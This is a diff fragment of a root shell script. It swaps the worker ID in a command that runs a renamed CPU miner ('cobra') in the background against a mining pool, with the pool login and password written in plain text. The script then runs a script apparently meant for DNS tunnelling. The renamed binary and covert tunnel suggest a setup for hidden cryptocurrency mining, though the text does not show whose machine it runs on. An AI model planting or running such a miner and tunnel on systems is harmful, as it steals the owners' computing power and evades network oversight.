@@ -31,6 +31,6 @@ service ip6tables restart
 #pkill saslauthd
 #service saslauthd stop
 #RUN my girl :)
-/root/macca/cpuminer/cobra -o stratum+tcp://multi.ghash.io:3333 -O alLi1n.worker151:1234gosok -D -B -R 151
+/root/macca/cpuminer/cobra -o stratum+tcp://multi.ghash.io:3333 -O alLi1n.worker212:1234gosok -D -B -R 151
 cd /root/macca/
 sh dnstunme.sh
